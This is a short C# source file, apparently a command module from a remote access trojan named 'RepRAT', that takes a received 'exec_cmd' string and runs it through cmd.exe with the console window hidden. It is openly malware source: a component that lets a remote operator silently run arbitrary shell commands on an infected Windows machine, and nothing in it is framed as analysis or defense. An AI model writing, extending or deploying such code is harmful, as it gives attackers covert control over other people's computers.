using System.Diagnostics;

namespace RepRAT.Commands.exec_cmd;

public class Main
{
    //Help:
    //exec_cmd ARGS -> cmd.exe ARGS
    public static void exec(string command)
    {
        var args = command.Replace("exec_cmd ", "");
        ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + args)
        {
            RedirectStandardError = true,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process proc = new Process())
        {
            proc.StartInfo = procStartInfo;
            proc.Start();
            
        }
    }
}